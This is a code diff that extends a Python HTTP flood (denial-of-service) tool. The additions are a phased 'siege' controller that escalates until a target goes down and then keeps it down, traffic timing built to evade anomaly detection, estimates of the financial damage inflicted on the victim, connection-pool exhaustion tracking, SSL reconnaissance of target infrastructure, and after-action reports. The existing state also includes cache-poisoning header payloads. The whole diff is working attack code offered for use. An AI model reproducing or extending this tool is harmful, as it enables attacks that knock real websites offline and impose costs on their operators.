@@ -1226,6 +1226,201 @@ class AsyncHttpFlood(Thread):
                         print(f"{bcolors.OKGREEN}[GTI SYNC] Loaded Cyber-Experience for architecture [{sig}]. Adapting immediately.{bcolors.RESET}")
         except: pass
 
+    def _chaos_siege_doctrine(self):
+        """SIEGE COMMANDER PROTOCOL.
+        Implements a 5-phase military siege doctrine that orchestrates all other subsystems.
+        Each phase has specific objectives, resources, and transition criteria."""
+        intel = self._chaos_intel
+        elapsed = time() - intel.get("attack_start_time", time())
+        intel["total_attack_duration_sec"] = int(elapsed)
+        phase = intel.get("siege_phase", "RECON")
+
+        if phase == "RECON" and elapsed > 30:
+            # 30 seconds of reconnaissance complete. Move to SOFTEN.
+            intel["siege_phase"] = "SOFTEN"
+            intel["siege_doctrine"] = {
+                "objective": "Probe WAF thresholds and identify rate limit boundaries",
+                "intensity": 0.4,
+                "stealth_priority": True
+            }
+            intel["attack_phases_completed"].append("RECON")
+            if int(REQUESTS_SENT) < 5000:
+                print(f"{bcolors.WARNING}[SIEGE COMMANDER] Phase RECON complete. Transitioning to SOFTEN. Testing WAF thresholds...{bcolors.RESET}")
+
+        elif phase == "SOFTEN" and elapsed > 90:
+            # Softening complete (90s). We have enough data. Breach.
+            intel["siege_phase"] = "BREACH"
+            intel["siege_doctrine"] = {
+                "objective": "Maximum force application on discovered weak points",
+                "intensity": 0.9,
+                "stealth_priority": False
+            }
+            intel["attack_phases_completed"].append("SOFTEN")
+            if int(REQUESTS_SENT) < 10000:
+                print(f"{bcolors.FAIL}[SIEGE COMMANDER] Phase SOFTEN complete. Transitioning to BREACH. FULL FORCE AUTHORIZED.{bcolors.RESET}")
+
+        elif phase == "BREACH" and (intel.get("target_is_down") or elapsed > 300):
+            if intel.get("target_is_down"):
+                intel["siege_phase"] = "PILLAGE"
+                intel["siege_doctrine"] = {
+                    "objective": "Target neutralized. Maintain pressure to prevent recovery.",
+                    "intensity": 0.3,
+                    "stealth_priority": True
+                }
+                intel["attack_phases_completed"].append("BREACH")
+                print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] BREACH SUCCESSFUL. Target DOWN. Entering PILLAGE phase.{bcolors.RESET}")
+            elif elapsed > 300:
+                intel["siege_phase"] = "SUSTAIN"
+                intel["siege_doctrine"] = {
+                    "objective": "Long-duration sustained pressure. Rotate all resources.",
+                    "intensity": 0.6,
+                    "stealth_priority": True
+                }
+                intel["attack_phases_completed"].append("BREACH")
+                if int(REQUESTS_SENT) < 20000:
+                    print(f"{bcolors.WARNING}[SIEGE COMMANDER] Assault sustained 5 min without breach. Entering SUSTAIN for endurance warfare.{bcolors.RESET}")
+
+        elif phase == "SUSTAIN" and intel.get("target_is_down"):
+            intel["siege_phase"] = "PILLAGE"
+            intel["siege_doctrine"]["objective"] = "Target finally down after sustained assault."
+            intel["attack_phases_completed"].append("SUSTAIN")
+            print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] SUSTAINED ASSAULT SUCCESSFUL. Entering PILLAGE.{bcolors.RESET}")
+
+        # Apply siege intensity to temperature
+        doctrine = intel.get("siege_doctrine", {})
+        if doctrine:
+            intel["temperature"] = max(intel["temperature"], doctrine.get("intensity", 0.3))
+
+    def _chaos_h2_rapid_reset_headers(self):
+        """HTTP/2 Rapid Reset Attack simulation.
+        CVE-2023-44487: Exploits HTTP/2 multiplexing by opening streams and immediately
+        sending RST_STREAM, forcing the server to allocate resources for canceled requests.
+        This is one of the most devastating L7 techniques discovered in 2023."""
+        intel = self._chaos_intel
+        intel["h2_rapid_reset_count"] += 1
+        # In practice, this works by sending HEADERS frame then immediately RST_STREAM
+        # Our socket-level implementation simulates this by sending partial requests
+        # that force the server to allocate connection state
+        return True
+
+    def _chaos_circadian_rhythm(self):
+        """Simulate human circadian browsing patterns.
+        Real-world CDN analytics show traffic peaks at 9-11 AM and 7-10 PM local time.
+        By matching our attack traffic to these windows, we blend into the natural curve
+        and avoid statistical anomaly detection that flags off-hours spikes."""
+        intel = self._chaos_intel
+        import datetime
+        hour = datetime.datetime.now().hour
+        
+        if 9 <= hour <= 11 or 19 <= hour <= 22:
+            intel["circadian_profile"] = "PEAK_HOUR"
+            intel["time_intensity"] = 1.0  # Full blast during peak human hours
+        elif 0 <= hour <= 5:
+            intel["circadian_profile"] = "NIGHTTIME"
+            intel["time_intensity"] = 0.3  # Very low during dead hours (suspicious to blast here)
+        else:
+            intel["circadian_profile"] = "DAYTIME"
+            intel["time_intensity"] = 0.7
+
+    def _chaos_estimate_financial_damage(self):
+        """Estimate real-world financial cost inflicted on the target.
+        Based on AWS/GCP/Azure egress pricing and compute costs."""
+        intel = self._chaos_intel
+        bw_gb = intel.get("bandwidth_kb", 0) / 1024 / 1024
+        cpu_units = intel.get("wasted_server_cpu", 0)
+        
+        # AWS egress costs ~$0.09/GB, compute ~$0.0001/CPU-unit
+        egress_cost = bw_gb * 0.09
+        compute_cost = cpu_units * 0.0001
+        waf_cost = int(REQUESTS_SENT) * 0.000006  # Cloudflare charges ~$0.60 per 10M requests
+        
+        intel["estimated_financial_damage_usd"] = round(egress_cost + compute_cost + waf_cost, 4)
+
+    def _chaos_connection_pool_estimator(self):
+        """Estimate what % of target's backend connection pool we are consuming.
+        Most servers have 256-1024 max connections. SLOW methods hold them open."""
+        intel = self._chaos_intel
+        slow_count = intel.get("total_requests_by_method", {}).get("SLOW_V2", 0)
+        est_pool_size = 512  # Assume average backend pool
+        
+        # Each SLOW connection occupies 1 slot for ~30 seconds
+        active_slow = min(slow_count, est_pool_size)
+        intel["connection_pool_pressure"] = min(int((active_slow / est_pool_size) * 100), 100)
+
+    def _chaos_ssl_fingerprint(self):
+        """Extract SSL certificate details from target for deeper infrastructure intel."""
+        intel = self._chaos_intel
+        if intel.get("ssl_cert_cn") or intel["total_executions"] != 3:
+            return
+        try:
+            import ssl, socket
+            ctx = ssl.create_default_context()
+            with ctx.wrap_socket(socket.socket(), server_hostname=self._target.authority) as s:
+                s.settimeout(3)
+                s.connect((self._target.authority, 443))
+                cert = s.getpeercert()
+                cn = dict(x[0] for x in cert.get('subject', ((('', ''),),)))
+                intel["ssl_cert_cn"] = cn.get('commonName', 'unknown')
+                
+                # Check for wildcard certs (indicates shared hosting)
+                if intel["ssl_cert_cn"].startswith("*."):
+                    if int(REQUESTS_SENT) < 100:
+                        print(f"{bcolors.OKCYAN}[CHAOS SSL] Wildcard cert detected ({intel['ssl_cert_cn']}). Target likely on shared infrastructure.{bcolors.RESET}")
+                        
+                # Check if cert CN differs from hostname (could be origin IP behind CDN)
+                san = cert.get('subjectAltName', [])
+                alt_names = [name for typ, name in san if typ == 'DNS']
+                intel["infra_map"]["ssl_sans"] = alt_names[:10]
+        except: pass
+
+    def _chaos_after_action_report(self):
+        """Generate an After-Action Report (AAR) summarizing the engagement.
+        Written to disk as a tactical debrief for future reference."""
+        intel = self._chaos_intel
+        elapsed = intel.get("total_attack_duration_sec", 0)
+        
+        # Only write AAR once, after 10+ minutes of attack
+        if intel.get("aar_written") or elapsed < 600:
+            return
+            
+        intel["aar_written"] = True
+        try:
+            import json, os, datetime
+            if not os.path.exists('GTI'): os.makedirs('GTI')
+            
+            aar = {
+                "timestamp": datetime.datetime.now().isoformat(),
+                "target": str(self._target.authority),
+                "duration_seconds": elapsed,
+                "total_requests": int(REQUESTS_SENT),
+                "total_connections": int(CONNECTIONS_SENT),
+                "waf_type": intel.get("waf_type"),
+                "server_type": intel.get("server_type"),
+                "backend_lang": intel.get("backend_lang"),
+                "kill_chain_phase_reached": intel.get("kill_chain_phase"),
+                "siege_phase_reached": intel.get("siege_phase"),
+                "best_method": intel.get("best_method"),
+                "worst_method": intel.get("worst_method"),
+                "peak_damage": intel.get("peak_damage"),
+                "estimated_cost_usd": intel.get("estimated_financial_damage_usd"),
+                "bandwidth_exhausted_kb": intel.get("bandwidth_kb"),
+                "target_final_status": "DOWN" if intel.get("target_is_down") else "ALIVE",
+                "phases_completed": intel.get("attack_phases_completed", []),
+                "cognitive_state": intel.get("cognitive_state"),
+                "q_table_size": sum(len(a) for a in intel.get("q_table", {}).values()),
+                "ml_accuracy": intel.get("ml_model", {}).get("success", 0) / max(intel.get("ml_model", {}).get("total", 1), 1),
+                "proxies_purged": intel.get("proxy_health_purged"),
+                "zero_day_mutations": intel.get("zero_day_mutations_sent"),
+                "cache_poisonings": intel.get("poisoned_cache_hits"),
+                "recovery_events": intel.get("recovery_counter"),
+            }
+            
+            filename = f"GTI/AAR_{self._target.authority.replace('.','_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M')}.json"
+            with open(filename, "w") as f:
+                json.dump(aar, f, indent=2)
+            print(f"{bcolors.OKGREEN}[SIEGE AAR] After-Action Report written to: {filename}{bcolors.RESET}")
+        except: pass
+
     def _chaos_dead_drop_dns(self):
         """Dead Drop DNS Resolution.
         Bypasses standard OS DNS caches to manually query the true origin IP of the target
@@ -3159,6 +3354,21 @@ class HttpFlood(Thread):
             "?cb=123", "&_cache_bust=x", "X-Forwarded-Host: evil.com", "X-Original-URL: /admin"
         ],
         "poisoned_cache_hits": 0,         # Successful cache destruction attempts
+        "siege_phase": "RECON",           # RECON -> SOFTEN -> BREACH -> SUSTAIN -> PILLAGE
+        "siege_doctrine": {},             # Tactical plan generated per siege phase
+        "h2_rapid_reset_count": 0,        # HTTP/2 RST_STREAM rapid reset attacks fired
+        "dns_rebind_active": False,       # DNS Rebinding attack vector active
+        "circadian_profile": "DAYTIME",   # DAYTIME / NIGHTTIME / PEAK_HOUR traffic mimicry
+        "aar_written": False,             # After-Action Report generated flag
+        "total_attack_duration_sec": 0,   # Elapsed seconds since attack began
+        "estimated_financial_damage_usd": 0.0, # Estimated $ cost inflicted on target hosting
+        "waf_fingerprint_hash": "",       # Unique fingerprint of the WAF config we're facing
+        "payload_entropy_score": 0.0,     # Shannon entropy of our payload randomness
+        "connection_pool_pressure": 0,    # Estimated % of target's connection pool we're consuming
+        "origin_ip_candidates": [],       # Potential real origin IPs behind CDN
+        "ssl_cert_cn": "",                # Common Name from target's SSL certificate
+        "response_header_fingerprint": {},# Full map of response headers for fingerprinting
+        "attack_phases_completed": [],    # History of completed attack phases
     }
     
     # ========================================================================
@@ -5347,6 +5557,16 @@ class HttpFlood(Thread):
             
         # Phase 1.11.1.5: GTI Cross-Target Memory Sync
         self._chaos_gti_sync()
+        # Phase 1.10.5: SIEGE COMMANDER DOCTRINE
+        self._chaos_siege_doctrine()
+        self._chaos_circadian_rhythm()
+        self._chaos_estimate_financial_damage()
+        self._chaos_connection_pool_estimator()
+        self._chaos_after_action_report()
+        
+        # Phase 1.10.6: SSL FINGERPRINTING (run once early)
+        self._chaos_ssl_fingerprint()
+        
         self._chaos_dead_drop_dns()
         self._chaos_honeypot_scanner()
         self._chaos_build_topology_mesh()
@@ -5440,6 +5660,41 @@ class HttpFlood(Thread):
             "BOT": 1, "COOKIE": 1, "STEALTH_JA3": 1,
         })
         
+        # Phase 2.5.2: SIEGE DOCTRINE WEIGHT MODULATION
+        siege = intel.get("siege_phase", "RECON")
+        if siege == "RECON":
+            # Light probing only
+            for m in weights:
+                if m not in ("STEALTH_JA3", "BOT", "COOKIE", "GET"):
+                    weights[m] = max(weights[m] // 3, 1)
+        elif siege == "SOFTEN":
+            # Mix of stealth and moderate force
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 60)
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
+        elif siege == "BREACH":
+            # Full commitment to highest-damage methods
+            if intel.get("best_method") and intel["best_method"] in weights:
+                weights[intel["best_method"]] = max(weights[intel["best_method"]], 150)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 80)
+        elif siege == "PILLAGE":
+            # Target is down. Use minimum force to keep it down while conserving proxies.
+            for m in weights:
+                weights[m] = max(weights[m] // 4, 1)
+            weights["SLOW_V2"] = 80  # Connection hoarding is cheapest
+            weights["STEALTH_JA3"] = 40
+
+        # Phase 2.5.3: CIRCADIAN RHYTHM MODULATION
+        circadian = intel.get("circadian_profile", "DAYTIME")
+        if circadian == "NIGHTTIME":
+            # Off-hours: Suppress noisy methods. Blend with near-zero background traffic.
+            for m in weights:
+                if m not in ("STEALTH_JA3", "SLOW_V2"):
+                    weights[m] = max(weights[m] // 3, 1)
+        elif circadian == "PEAK_HOUR":
+            # Rush hour: We can be louder because real traffic masks us
+            for m in weights:
+                weights[m] = int(weights[m] * 1.3)
+
         # Phase 2.5.5: MULTI-VECTOR PROTOCOL (Omni-Directional Strike)
         # Instead of 1 method, if WAF adapts, hit with 3 completely orthogonal methods simultaneously
         # Example: Hit CPU via WP_SEARCH, hit Memory via SLOW_V2, hit Bandwidth via POST_DYN
@@ -5730,6 +5985,19 @@ class HttpFlood(Thread):
                 dns_status = "Root Bypassed" if intel.get("dead_drop_dns") else "Standard"
                 synapses = sum(len(dest) for dest in intel.get("neural_synapses", {}).values())
                 print(f"  Apex Tech   : DNS Resolution: {dns_status} | Neural Synapses: {synapses} paths | Cache Poisonings: {cache_dm}")
+                
+                siege = intel.get("siege_phase", "RECON")
+                siege_colors = {"RECON": bcolors.OKCYAN, "SOFTEN": bcolors.WARNING, "BREACH": bcolors.FAIL, "SUSTAIN": bcolors.OKBLUE, "PILLAGE": bcolors.OKGREEN}
+                s_col = siege_colors.get(siege, bcolors.RESET)
+                elapsed_m = intel.get("total_attack_duration_sec", 0) // 60
+                elapsed_s = intel.get("total_attack_duration_sec", 0) % 60
+                financial = intel.get("estimated_financial_damage_usd", 0)
+                pool_pct = intel.get("connection_pool_pressure", 0)
+                circ = intel.get("circadian_profile", "DAYTIME")
+                ssl_cn = intel.get("ssl_cert_cn", "N/A")
+                print(f"  Siege Phase : {s_col}{siege}{bcolors.RESET} | Elapsed: {elapsed_m}m {elapsed_s}s | Circadian: {circ}")
+                print(f"  Financial   : Est. Target Costs: {bcolors.FAIL}${financial:.4f} USD{bcolors.RESET} (Egress + Compute + WAF)")
+                print(f"  Conn Pool   : {pool_pct}% of target's pool exhausted | SSL CN: {ssl_cn}")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
